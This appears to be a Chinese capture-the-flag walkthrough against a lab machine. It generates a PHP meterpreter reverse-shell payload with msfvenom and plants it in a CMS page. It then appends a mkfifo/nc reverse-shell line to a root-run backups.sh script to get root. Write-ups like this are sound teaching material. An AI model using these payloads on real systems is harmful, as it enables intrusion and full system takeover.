![](https://pic1.zhimg.com/80/v2-eefce38646bcc8d098b593d9adde9020_720w.webp)

  

启用之后在`Content` 中添加我们的脚本木马，添加脚本木马前先用 `MSF` 生成一个 `PHP` 的木马：

```text
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.128 LPORT=7777 -f raw
```

  

![](https://pic4.zhimg.com/80/v2-d4fa652471c6dbe3a0ed03a530feaa13_720w.webp)

  

紧接着打开 `MSF` 设置参数开启监听：

  

![](https://pic3.zhimg.com/80/v2-9d204d39b894f6bcb4ba31631309185e_720w.webp)

  

最后添加我们的脚本代码到页面中：

  

![](https://pic1.zhimg.com/80/v2-13171a3e686c47dc9f7db83f534e544c_720w.webp)

  

  

![](https://pic2.zhimg.com/80/v2-93072f85a3c3bb21d7ad898ba84c33a1_720w.webp)

  

（PS：如果失败了那么先设置为 `PHP code`，再把脚本代码放进去保存就可以了）

设置好之后成功反弹得到一枚 `shell`：

  

![](https://pic3.zhimg.com/80/v2-a27bf57ddf837b65b63d9a0d29d6904a_720w.webp)

  

得到`shell`之后用`MSF`自带的模块查看有没有可以提权的模块，但是发现没有可利用提权的地方：

  

![](https://pic1.zhimg.com/80/v2-b54b7641de91321890e10dcb9dbdb5e8_720w.webp)

  

先让它切换到 `shell` 环境把：

```text
shell
python -c 'import pty;pty.spawn("/bin/bash")'
```

  

![](https://pic3.zhimg.com/80/v2-8d101bf60f8ddb94426e6070d348f6e6_720w.webp)

  

## 利用backups.sh文件提权

随后我们来到了 `/opt/scripts` 目录下，因为之前我们知道了 `backups.sh` 它只能 `root` 用户和 `www-data` 用户权限去修改它：

  

![](https://pic3.zhimg.com/80/v2-d340e05c1537dfe63e3ce91771d1ca4a_720w.webp)

  

所以我们就可以利用这段代码来反弹一个 `shell` 到 `KALI`，反弹回来的`shell`自然就是`root`权限！

先是我们在 KALI `nc` 监听 `8888` ，然后输入这段代码：

```text
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.128 8888 >/tmp/f" >> backups.sh
```

  

![](https://pic1.zhimg.com/80/v2-99f2f5efea0c06b1ab2f932d445cfd88_720w.webp)

  

这个时候就成功获取到 `root` 权限，拿到 `FLAG`：

  

![](https://pic1.zhimg.com/80/v2-9e03285b217b333dc23f4cf7f619fd28_720w.webp)